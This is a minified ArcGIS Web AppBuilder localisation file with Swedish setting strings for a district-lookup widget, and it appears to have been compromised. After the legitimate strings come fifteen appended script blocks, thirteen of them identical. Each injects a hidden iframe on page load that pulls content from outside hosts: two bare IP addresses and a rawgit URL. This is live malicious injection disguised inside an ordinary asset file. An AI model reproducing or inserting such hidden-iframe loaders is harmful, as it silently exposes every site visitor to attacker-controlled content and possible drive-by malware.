// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Mile",kilometers:"Kilometer",feet:"Fot",meters:"Meter"},layerSetting:{layerSettingTabTitle:"S\u00f6kinst\u00e4llningar",buttonSet:"Ange",selectLayersLabel:"V\u00e4lj lager",selectLayersHintText:"Tips: Anv\u00e4nds f\u00f6r att markera polygonlager och tillh\u00f6rande punktlager.",selectPrecinctSymbolLabel:"V\u00e4lj symbol f\u00f6r att markera polygon",selectGraphicLocationSymbol:"Adress- eller platssymbol",graphicLocationSymbolHintText:"Tips: Symbol f\u00f6r adresser som anv\u00e4ndarna s\u00f6kt efter eller platser som de klickat p\u00e5",
precinctSymbolHintText:"Tips: Anv\u00e4nds f\u00f6r att visa symbolen f\u00f6r en markerad polygon",selectColorForPoint:"V\u00e4lj f\u00e4rg f\u00f6r att markera punkt",selectColorForPointHintText:"Tips: Anv\u00e4nds f\u00f6r att visa markeringsf\u00e4rg f\u00f6r en vald punkt"},searchSourceSetting:{searchSourceSettingTabTitle:"S\u00f6k k\u00e4llinst\u00e4llningar",searchSourceSettingTitle:"S\u00f6k k\u00e4llinst\u00e4llningar",searchSourceSettingTitleHintText:"L\u00e4gg till och konfigurera geokodningstj\u00e4nster eller geoobjektslager som s\u00f6kk\u00e4llor. Dessa angivna k\u00e4llor avg\u00f6r vad som g\u00e5r att s\u00f6ka i s\u00f6krutan",
addSearchSourceLabel:"L\u00e4gg till s\u00f6kk\u00e4lla",featureLayerLabel:"geoobjektslager",geocoderLabel:"Geokodare",nameTitle:"Namn",generalSettingLabel:"Allm\u00e4n inst\u00e4llning",allPlaceholderLabel:"Platsh\u00e5llartext f\u00f6r s\u00f6kning i alla:",allPlaceholderHintText:"Tips: Ange text som ska visas som platsh\u00e5llare n\u00e4r du s\u00f6ker i alla lager och geokodare",generalSettingCheckboxLabel:"Visa popup f\u00f6r det hittade geoobjekt eller den hittade platsen",countryCode:"Lands- eller regionkoder",
countryCodeEg:"till exempel ",countryCodeHint:"Om du l\u00e4mnar det h\u00e4r v\u00e4rdet tomt sker s\u00f6kningen i alla l\u00e4nder och regioner",questionMark:"?",searchInCurrentMapExtent:"S\u00f6k bara i den aktuella kartutbredningen",zoomScale:"Zoomningsskala",locatorUrl:"Geokodarens URL",locatorName:"Geokodarens namn",locatorExample:"Exempel",locatorWarning:"Den h\u00e4r versionen av geokodningstj\u00e4nsten st\u00f6ds inte. Widgeten har st\u00f6d f\u00f6r geokodningstj\u00e4nsten 10.0 och h\u00f6gre.",
locatorTips:"F\u00f6rslag finns inte tillg\u00e4ngliga eftersom geokodningstj\u00e4nsten inte har st\u00f6d f\u00f6r f\u00f6rslagsfunktionen.",layerSource:"Lagerk\u00e4lla",setLayerSource:"Ange lagerk\u00e4lla",setGeocoderURL:"Ange URL till geokodare",searchLayerTips:"F\u00f6rslag finns inte tillg\u00e4ngliga eftersom geoobjektstj\u00e4nsten inte har st\u00f6d f\u00f6r pagineringsfunktionen.",placeholder:"Platsh\u00e5llartext",searchFields:"S\u00f6kf\u00e4lt",displayField:"Visa f\u00e4lt",exactMatch:"Exakt matchning",
maxSuggestions:"Maximalt antal f\u00f6rslag",maxResults:"Maximala resultat",enableLocalSearch:"Aktivera lokal s\u00f6kning",minScale:"Minimiskala",minScaleHint:"N\u00e4r kartans skala \u00e4r st\u00f6rre \u00e4n denna skala anv\u00e4nds lokal s\u00f6kning",radius:"Radie",radiusHint:"Anger radien f\u00f6r ett omr\u00e5de kring den aktuella kartans mitt som ska anv\u00e4ndas f\u00f6r att h\u00f6ja rangordningen f\u00f6r geokodningskandidater s\u00e5 att de kandidater som \u00e4r n\u00e4rmast platsen returneras f\u00f6rst",
meters:"Meter",setSearchFields:"Ange s\u00f6kf\u00e4lt",set:"Ange",fieldName:"Namn",invalidUrlTip:"URL:en ${URL} \u00e4r ogiltig eller g\u00e5r inte att \u00f6ppna.",invalidSearchSources:"Ogiltiga s\u00f6kk\u00e4llinst\u00e4llningar"},layerSelector:{selectPolygonLayerLabel:"V\u00e4lj polygonlager",selectPolygonLayerHintText:"Tips: Anv\u00e4nds f\u00f6r att markera polygonlager.",selectRelatedPointLayerLabel:"Markera punktlager som \u00e4r kopplade till polygonlager",selectRelatedPointLayerHintText:"Tips: Anv\u00e4nds f\u00f6r att markera punktlager som \u00e4r kopplade till polygonlager",
polygonLayerNotHavingRelatedLayer:"V\u00e4lj ett polygonlager som har ett tillh\u00f6rande punktlager.",errorInSelectingPolygonLayer:"V\u00e4lj ett polygonlager som har ett tillh\u00f6rande punktlager.",errorInSelectingRelatedLayer:"Markera punktlager som \u00e4r kopplade till polygonlager."},routeSetting:{routeSettingTabTitle:"Riktningsinst\u00e4llningar",routeServiceUrl:"Ruttj\u00e4nst",buttonSet:"Ange",routeServiceUrlHintText:"Tips: Klicka p\u00e5 Ange f\u00f6r att leta efter och markera en ruttj\u00e4nst f\u00f6r n\u00e4tverksanalys",
directionLengthUnit:"L\u00e4ngdenheter f\u00f6r riktning",unitsForRouteHintText:"Tips: Anv\u00e4nds f\u00f6r att visa rapporterade enheter f\u00f6r rutter",selectRouteSymbol:"V\u00e4lj symbol f\u00f6r visning av rutten",routeSymbolHintText:"Tips: Visade tidigare en linjesymbol f\u00f6r rutten",routingDisabledMsg:"Om du vill anv\u00e4nda rutter och v\u00e4gbeskrivningar m\u00e5ste du kontrollera att det har aktiverats i objektet ArcGIS Online."},networkServiceChooser:{arcgislabel:"L\u00e4gg till fr\u00e5n ArcGIS Online",
serviceURLabel:"L\u00e4gg till tj\u00e4nst-URL",routeURL:"Rutt-URL",validateRouteURL:"Validera",exampleText:"Exempel",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Ange en giltig ruttj\u00e4nst.",rateLimitExceeded:"Hastighetsbegr\u00e4nsningen \u00f6verskreds. F\u00f6rs\u00f6k igen senare.",errorInvokingService:"Anv\u00e4ndarnamn eller l\u00f6senord \u00e4r felaktigt."},
symbolPickerPreviewText:"F\u00f6rhandsgranska:",showToolToSelectLabel:"Ange plats-knapp",showToolToSelectHintText:"Tips: Tillhandah\u00e5ller en knapp f\u00f6r att ange platsen p\u00e5 kartan, i st\u00e4llet f\u00f6r att alltid ange plats n\u00e4r kartan klickas",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});